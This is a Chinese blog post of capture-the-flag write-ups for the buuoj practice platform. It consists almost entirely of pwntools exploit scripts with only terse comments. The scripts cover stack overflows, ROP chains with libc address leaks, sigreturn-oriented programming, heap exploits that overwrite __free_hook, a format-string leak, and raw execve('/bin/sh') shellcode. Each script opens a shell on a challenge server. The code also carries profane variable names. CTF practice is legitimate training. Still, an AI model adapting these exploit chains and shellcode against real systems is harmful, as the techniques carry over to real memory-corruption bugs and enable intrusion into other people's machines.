---
layout: post
title:  "buuoj-从Pwn到去世"
date:   2019-9-3
desc: ""
keywords: ""
categories: [Ctf]
tags: [CTF,buuoj,Pwn]
icon: icon-html
---

# buuoj-从Pwn到去世

![11](https://raw.githubusercontent.com/AiDaiP/images/master/pwn/11.png)

* ### 连上就有flag的pwn

  nc [pwn.buuoj.cn](http://pwn.buuoj.cn/) 6000 

* ### RIP覆盖一下

  ```python
  from pwn import *
  r = remote('pwn.buuoj.cn',6001)
  payload = 'a'*23 + p64(0x0401186)
  r.sendline(payload)
  r.interactive()
  ```

* ### ciscn_2019_c_1

  ```python
  from pwn import *
  r = remote('pwn.buuoj.cn',20115)
  elf = ELF('ciscn_2019_c_1')
  libc = ELF('x64_libc.so.6')
  
  
  puts_plt = elf.plt['puts']
  puts_got = elf.got['puts']
  puts_libc = libc.symbols['puts']
  main = elf.symbols['main']
  system_libc = libc.symbols['system']
  pop_rdi = 0x400c83
  binsh_libc = 0x18cd57
  
  
  payload ='a' * 0x58+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
  r.recvuntil('Input your choice!\n')
  r.sendline('1')
  r.recvuntil('Input your Plaintext to be encrypted\n')
  r.sendline(payload)
  
  r.recvuntil('@\n')
  puts_addr = u64(r.recv(6).ljust(8,'\x00'))
  libc_base = puts_addr - libc.sym['puts']
  
  system = libc_base + system_libc
  binsh = libc_base + binsh_libc
  
  payload ='A'*0x58+p64(pop_rdi)+p64(binsh)+p64(system)
  r.recvuntil('Input your choice!\n')
  r.sendline('1')
  r.recvuntil('Input your Plaintext to be encrypted\n')
  r.sendline(payload)
  
  r.interactive()
  ```

  

* ### warmup_csaw_2016

  ```python
  from pwn import *
  r = remote('pwn.buuoj.cn',20035)
  payload = 'a'*0x48 + p64(0x40060d)
  r.sendline(payload)
  r.interactive()
  ```

* ### pwn1_sctf_2016

  ```python
  from pwn import *
  r = remote('pwn.buuoj.cn',20086)
  payload = 'I'*0x14 + p32(0xdeadbeef) + p32(0x08048F0D)
  r.sendline(payload)
  r.interactive()
  ```

* ### ciscn_2019_en_2

  ciscn_2019_c_1

* ### babyheap_0ctf_2017

  略

* ### ciscn_2019_n_1

  wdnmd cat /flag是假的

  ```python
  from pwn import *
  r = remote('pwn.buuoj.cn',20137)
  elf = ELF('./ciscn_2019_n_1')
  libc = ELF('./x64_libc.so.6')
  system = 0x400530
  #flag = 0x4007cc
  p_rdi = 0x400793
  main = 0x4006dc
  one = 0xf1147
  puts_got = elf.got['puts']
  puts_plt = elf.plt['puts']
  puts_libc = libc.symbols['puts']
  #payload = 'a'*0x38 + p64(p_rdi) + p64(flag) + p64(system)
  payload = 'a'*0x38 + p64(p_rdi) + p64(puts_got) + p64(puts_plt) +p64(main)
  r.sendline(payload)
  r.recvuntil('11.28125\n')
  puts = r.recvuntil('\n',drop = True).ljust(8,'\x00')
  puts = u64(puts)
  log.success(hex(puts))
  libc_base = puts - puts_libc
  log,success(hex(libc_base))
  fuck = one + libc_base
  payload = 'a'*0x38 + p64(fuck)
  r.sendline(payload)
  r.interactive()
  ```

  

* ### get_started_3dsctf_2016

  mprotect在bss开一段跑shellcode

  ```python
  from pwn import *
  r = remote('pwn.buuoj.cn',20004)
  elf = ELF('./get_started_3dsctf_2016')
  read_addr = elf.symbols['read']
  mprotect = elf.symbols['mprotect']
  bss_addr = 0x80ebf80
  pop3_ret = 0x804f460
  shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
  payload = 'a'*56
  payload += p32(read_addr)
  payload += p32(pop3_ret)
  payload += p32(0)
  payload += p32(bss_addr)
  payload += p32(0x100)
  payload += p32(mprotect)
  payload += p32(bss_addr)
  payload += p32(0x80eb000)
  payload += p32(0x1000)
  payload += p32(7)
  r.sendline(payload)
  r.sendline(shellcode)
  r.interactive()
  ```

* ### babyfengshui_33c3_2016

  ```c
  struct user {
      char *desc;
      char name[0x7c];
  } user;
  struct user *store[50];
  //0x804b069 user_num
  //0x804b080 store
  ```

  delete时user->desc没有置零，user_num 不变

  有保护措施防止溢出

  ```c
  (store[i]->desc + test_size) < (store[i] - 4)
  ```

  添加两个user，free第一个，然后再添加一个user，description长度为第一个user的description 长度加上user结构体的长度，可以绕过检查，造成堆溢出，修改第二个user的desc指针

  ```python
  from pwn import *
  r = remote('pwn.buuoj.cn',20002)
  elf = ELF('./babyfengshui_33c3_2016')
  libc = ELF('./x86_libc.so.6')
  free_got = elf.got['free']
  free_libc = libc.symbols['free']
  system_libc = libc.symbols['system']
  
  def add_user(size, length, text):
      r.sendlineafter('Action: ', '0')
      r.sendlineafter('description: ', str(size))
      r.sendlineafter('name: ', 'nmsl')
      r.sendlineafter('length: ', str(length))
      r.sendlineafter('text: ', text)
  
  def delete_user(index):
      r.sendlineafter('Action: ', '1')
      r.sendlineafter('index: ', str(index))
   
  def display_user(index):
      r.sendlineafter('Action: ', '2')
      r.sendlineafter('index: ', str(index))
   
  def update(index, length, text):
      r.sendlineafter('Action: ', '3')
      r.sendlineafter('index: ', str(index))
      r.sendlineafter('length: ', str(length))
      r.sendlineafter('text: ', text)
  
  add_user(0x80,0x80,'fuck')
  add_user(0x80,0x80,'fuck')
  add_user(0x8,0x8,'/bin/sh\x00')
  delete_user(0)
  payload = 'a'*0x198 + p32(free_got)
  add_user(0x100,0x19c,payload)
  display_user(1)
  r.recvuntil('description: ')
  free = u32(r.recv(4))
  libc_base = free - free_libc
  system = libc_base + system_libc
  log.success('libc_base {}'.format(hex(libc_base)))
  update(1,0x4,p32(system))
  delete_user(2)
  r.interactive()
  ```

* ### pwn2_sctf_2016

  ```python
  from pwn import *
  r = remote('pwn.buuoj.cn',20087)
  #context.log_level = 'debug'
  elf = ELF('./pwn2_sctf_2016')
  libc = ELF('./x86_libc.so.6')
  printf_plt = elf.plt['printf']
  printf_got = elf.got['printf']
  main = elf.symbols['main']
  printf_libc = libc.symbols['printf']
  system_libc = libc.symbols['system']
  binsh_libc = libc.search('/bin/sh').next()
  r.recvuntil('read?')
  r.sendline('-1')
  payload = 'a'*(0x2c+0x4) + p32(printf_plt) + p32(main) + p32(printf_got)
  r.sendline(payload)
  printf = u32(r.recvuntil('How',drop = True)[-16:-12])
  libc_base = printf - printf_libc
  system = system_libc + libc_base
  binsh = binsh_libc + libc_base
  log.success(hex(libc_base))
  payload = 'a'*(0x2c+0x4) + p32(system)+p32(main)+p32(binsh)
  r.sendline('-1')
  r.sendline(payload)
  r.interactive()
  ```

* ### [OGeek2019]babyrop

  略

* ### [OGeek2019]bookmanager

  略

* ### ez_pz_hackover_2016

  地址白给，跳shellcode

  ```python
  from pwn import *
  r = remote('pwn.buuoj.cn',20040)
  shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
  r.recvuntil("Yippie, lets crash:")
  fuck_addr = int(r.recvline().strip(), 16)
  r.recvuntil('>')
  payload = 'crashme\x00' + '\x90'*0x12 + p32(fuck_addr) + '\x90'*0x100 + shellcode
  r.sendline(payload)
  r.interactive()
  ```

* ### not_the_same_3dsctf_2016

  白给函数读flag

  ```
  from pwn import *
  r = remote('pwn.buuoj.cn',20007)
  context.log_level = 'debug'
  fuck = 0x80489a0
  flag = 0x80eca2d
  write = 0x806e270
  payload = 'a'*0x2d + p32(fuck)+p32(write)+p32(main)+p32(1)+p32(flag)+p32(100)
  r.sendline(payload)
  r.interactive()
  ```

* ###  ciscn_2019_s_3

  只有read和write

  有个叫gadgets的白给函数，返回15

  rax为15，对应的系统调用为__NR_rt_sigreturn 

  SROP

  找一波gadgets，调用write找个地方写/bin/sh，然后在那溢出跑execve("/bin/sh",0,0)

  ```python
  from pwn import *
  r = remote('pwn.buuoj.cn', 20154)
  context.arch = 'amd64'
  syscall_ret = 0x400517
  mov_rax_15 = 0x4004DA
  sigreturn = p64(mov_rax_15) + p64(syscall_ret)
  
  fuck = SigreturnFrame()
  fuck.rdi = 0
  fuck.rsi = 0x601000
  fuck.rdx = 1000
  fuck.rax = 0
  fuck.rsp = 0x601050
  fuck.rip = syscall_ret
  payload = 'a'*0x10 + sigreturn + str(fuck)
  r.sendline(payload)
  
  wdnmd = SigreturnFrame()
  wdnmd.rdi = 0x601000
  wdnmd.rsi = 0
  wdnmd.rdx = 0
  wdnmd.rax = 59
  wdnmd.rsp = 0x601050
  wdnmd.rip = syscall_ret
  payload = '/bin/sh'.ljust(0x50,'\x00')+sigreturn+str(wdnmd)
  r.sendline(payload)
  
  r.interactive()
  ```

* ### ciscn_2019_n_8

  ```
  from pwn import *
  r = remote('pwn.buuoj.cn', 20144)
  payload = p32(17)*14
  r.sendline(payload)
  r.interactive()
  ```

* ### 0ctf 2016 warmup 

  alarm返回值

  如果调用此alarm()前，进程已经设置了闹钟时间，则返回上一个闹钟时间的剩余时间，否则返回0 

  程序执行时间很短，第一次调用alarm(5)，然后再次调用alarm，返回5，得到open的系统调用号，然后跳到0x8048122执行系统调用打开flag

  先找个地方把'/home/warmup/flag.txt\x00'写进去，然后两次alarm得到系统调用号，打开flag

  调用read把flag写到0x8049200然后在write到标准输出

  ```python
  from pwn import *
  #r = remote('pwn.buuoj.cn', 20000)
  r = process('warmup')
  flag = '/home/warmup/flag.txt\x00'
  fuck_addr = 0x8049200
  read = 0x804811d
  write = 0x8048135
  alarm = 0x804810d
  main = 0x0804815a
  fuck_open = 0x8048122
  padding = 'a'*0x20
  payload = padding+p32(read)+p32(main)+p32(0)+p32(fuck_addr)+p32(len(flag))
  payload += flag
  payload += padding+p32(alarm)+p32(main)+p32(5)+p32(0)+p32(0)
  payload += padding+p32(alarm)+p32(fuck_open)+p32(main)+p32(fuck_addr)+p32(0)
  payload += padding+p32(read)+p32(main)+p32(3)+p32(fuck_addr)+p32(100)
  payload += padding+p32(write)+p32(0)+p32(1)+p32(fuck_addr)+p32(100)
  r.sendline(payload)
  r.interactive()
  ```

  本地能跑出来远程跑不成，gg

  

* ### oneshot_tjctf_2016

  ```python
  from pwn import *
  r = remote('pwn.buuoj.cn', 20082)
  elf = ELF('./oneshot_tjctf_2016')
  libc = ELF('./x64_libc.so.6')
  puts_got = elf.got['puts']
  puts_libc = libc.symbols['puts']
  one_libc = 0x45216
  r.sendline(str(puts_got))
  r.recvuntil('Value: ')
  puts = int(r.recvuntil('\n',drop = True),16)
  libc_base = puts - puts_libc
  log.success(hex(libc_base))
  fuck = libc_base + one_libc
  r.sendline(str(fuck))
  r.interactive()
  ```

* ### ciscn_2019_es_2

  ```python
  from pwn import *
  r = remote('pwn.buuoj.cn',20174)
  #context.log_level = 'debug'
  elf = ELF('./ciscn_2019_es_2')
  libc = ELF('./x86_libc.so.6')
  main = 0x80485ff
  puts_got = elf.got['puts']
  puts_libc = libc.symbols['puts']
  call_puts = 0x804861D
  
  payload = 'a'*0x20+p32(puts_got)+'b'*8+p32(main)
  r.sendline('nmsl')
  r.sendline(payload)
  payload = 'a'*0x20+p32(puts_got)+'b'*8+p32(call_puts)
  r.sendline('fuck')
  r.recvuntil('Hello, ')
  r.send(payload)
  r.recvuntil(payload)
  r.recv(25)
  libc_base = u32(r.recv(4)) - puts_libc
  log.success(hex(libc_base))
  one = libc_base + 0x3a80c
  
  payload = 'a'*0x2c+p32(one)
  r.sendline('wdnmd')
  r.sendline(payload)
  r.interactive()
  ```

* ### tiny_backdoor_v1_hackover_2016

  能写9字节的shellcode

  先写个read，然后写更长的shellcode

  ```python
  from pwn import *
  context(arch = 'amd64', os = 'linux')
  r = remote('pwn.buuoj.cn',20050)
  fuck = [
      0xb3,0x91,0x7f,0xdd,0x62,0x81,0x11,0x6a,
      0x90,0x8c,0xdb,0xae,0x70,0xa7,0x3f,0xff,
      0x3a,0xc3,0xe6,0x32,0xff,0x5e,0x46,0x63,
      0x9a,0x14,0xb7,0x9e,0xad,0xf6,0x09,0xdc,
      0x33,0x2f,0x35,0xc6,0x6f,0x1a,0x7f,0xff,
      0x1b,0xc2,0xb5,0xb7,0xb7,0xc2,0xd1,0x75,
  ]
  def xor(str):
  	res = ''
  	for i in range(len(str)):
  		res += chr(ord(str[i])^fuck[i])
  	return res
  #payload = '\xe6\xd9\xf6\x38\x2a\x02\xfd\x3a\xc3'
  shellasm = '''
  pop rbp
  pop rax
  pop rdi
  mov dl,0xff
  syscall
  jmp rsi
  '''
  shellcode = asm(shellasm)
  payload = xor(shellcode)
  log.info(len(payload))
  r.send(payload)
  
  shellasm = '''
  mov rax,59
  mov rdi,0x600170
  xor rsi,rsi
  xor rdx,rdx
  syscall
  '''
  shellcode = '\x90'*0x1e+asm(shellasm)
  payload = shellcode.ljust(0x3a,'a')+'/bin/sh\x00'
  log.info(len(payload))
  r.send(payload)
  r.interactive()
  ```

* ### ciscn_2019_s_4

  ciscn_2019_es_2

* ### bbys_tu_2016

  ```python
  from pwn import *
  r = remote('pwn.buuoj.cn',20060)
  payload = 'a'*24+p32(0x804856d)+p32(0)
  r.sendline(payload)
  r.interactive()
  ```

* ### ciscn_2019_sw_7

  ```python
  from pwn import *
  r = remote('pwn.buuoj.cn',20134)
  elf = ELF('./ciscn_2019_sw_7')
  libc = ELF('./x64_libc.so.6')
  
  def add(size,content):
  	r.sendlineafter('>','1')
  	r.sendlineafter('note:',str(size))
  	r.sendlineafter('note:',str(content))
  	r.recvuntil('[')
  	leak = r.recvuntil(']',drop = True)
  	return int(leak,16)
  
  def show(index):
  	r.sendlineafter('>','2')
  	r.sendlineafter('Index:',str(index))
  
  def edit():
  	r.sendlineafter('>','3')
  	print('wdnmd')
  
  def delete(index):
  	r.sendlineafter('>','4')
  	r.sendlineafter('Index:',str(index))
  
  
  add(0x10,'fuck')
  add(0x10,'fuck')
  add(0x60,'fuck')
  add(0x60,'fuck')
  add(0x10,'fuck')
  delete(0)
  payload = p64(0)*2+p64(0x91)+p64(0)*5
  add(-1,payload)
  delete(1)
  add(0x10,'fuck')
  show(2)
  r.recvuntil('2 : ')
  main_arena_88 = u64(r.recvuntil('\n',drop=True).ljust(8,'\x00'))
  main_arena = main_arena_88 - 88
  libc_base = main_arena - 0x3c4b20 
  one = libc_base + 0x4526a
  free_hook = libc_base + 0x3C67A8
  log.success('libc_base:'+hex(libc_base))
  log.success('free_hook:'+hex(free_hook))
  log.info(hex(free_hook-0x40))
  
  delete(0)
  payload = p64(0)*2+p64(0x21)+p64(0)*3+p64(0x71)+p64(0)+p64(free_hook-0x40)
  add(-1,payload)
  add(0x60,'fuck')
  delete(0)
  delete(3)
  
  payload = p64(0)*20+p64(0x71)+p64(free_hook-0x33)
  add(-1,payload)
  add(0x60,'fuck')
  payload = '\x7f\x00\x00'+p64(0)*3+p64(one)
  add(0x60,payload)
  delete(4)
  r.interactive()
  ```

  

* ### ciscn_2019_final_3

  合并堆块得到unsorted bin，利用gift泄露libc

  然后改free hook

  ```python
  from pwn import *
  #r = remote('pwn.buuoj.cn',20232)
  r = process('./ciscn_final_3')
  elf = ELF('./ciscn_final_3')
  libc = ELF('./libc.so.6')
  
  def add(index,size,sth):
  	r.sendlineafter('choice >','1')
  	r.sendlineafter('index',str(index))
  	r.sendlineafter('size',str(size))
  	r.sendlineafter('something',str(sth))
  	r.recvuntil('gift :')
  	gift = r.recvuntil('\n',drop = True)
  	log.info(str(index)+':'+gift)
  	return int(gift,16)
  
  def remove(index):
  	r.sendlineafter('choice >','2')
  	r.sendlineafter('index',str(index))
  
  
  fuck_addr1 = add(0,0x78,'fuck')
  add(1,0,'')
  add(2,0x78,'fuck')
  add(3,0x78,'fuck')
  add(4,0x78,'fuck')
  add(5,0x78,'fuck')
  add(6,0x78,'fuck')
  add(7,0x78,'fuck')
  add(8,0x78,'fuck')
  add(9,0x78,'fuck')
  add(10,0x78,'fuck')
  remove(10)
  remove(10)
  add(11,0x78,p64(fuck_addr1-0x10))
  add(12,0x78,p64(fuck_addr1-0x10))
  add(13,0x78,p64(0)+p64(0x4a1))
  remove(0)
  remove(1)
  
  add(14,0x78,'fuck')
  add(15,0,'')
  main_arena_96 = add(16,0,'')
  libc_base = main_arena_96 - 0x3ebca0
  free_hook = libc_base + libc.symbols['__free_hook']
  one = libc_base + 0x4f322
  log.success('free_hook:'+hex(free_hook))
  log.success('one:'+hex(one))
  add(17,0x60,'nmsl')
  remove(17)
  remove(17)
  add(18,0x60,p64(free_hook))
  add(19,0x60,p64(free_hook))
  add(20,0x60,p64(one))
  remove(0)
  r.interactive()
  ```

* ### ciscn_2019_ne_5

  ```python
  from pwn import *
  r = remote('pwn.buuoj.cn',20171)
  r.sendline('administrator')
  elf = ELF('./ciscn_2019_ne_5')
  system = elf.symbols['system']
  binsh = 0x080482ea
  payload = 'a'*76+p32(system)+p32(0xdeadbeef)+p32(binsh)
  r.sendline('1')
  r.recvuntil('Please input new log info:')
  r.sendline(payload)
  r.sendline('4')
  r.interactive()
  ```

* ### judgement_mna_2016

  flag在栈上

  ```c
  %28$s
  ```

  


